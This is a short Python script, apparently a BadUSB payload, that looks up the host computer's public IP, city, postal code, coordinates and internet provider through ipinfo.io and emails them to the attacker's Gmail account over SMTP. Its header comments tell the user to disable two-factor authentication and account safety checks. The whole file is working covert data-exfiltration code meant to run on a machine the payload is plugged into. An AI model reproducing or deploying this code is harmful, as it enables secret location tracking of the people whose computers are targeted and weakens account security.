# Remember to turn of second factor auth and turn of safety app requirements in google account
# Author  https://github.com/Kleszcz1337
import smtplib
from email.message import EmailMessage 
import time
import os
import imghdr
import requests

res = requests.get('https://ipinfo.io/') #service which provied us gps
data = res.json()

message = EmailMessage()

city = data['city']
postal = data['postal']
region = data['region']
ip = data['ip']
provider = data['org']
location = data['loc']


time.sleep(1)

EMAIL_ADRESS = "nickname@gmail.com"
EMAIL_PASSWORD = "password"
message['From'] = EMAIL_ADRESS
message['To'] = EMAIL_ADRESS
message['Subject'] = 'Location from your BadUsb'

message.add_alternative("Message sent from ip: " + ip +  " City: " + city + " " + postal +" Location : " + location + " Around: " + region + " Internet provider: " + provider)

with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
    smtp.login(EMAIL_ADRESS, EMAIL_PASSWORD)
    smtp.send_message(message)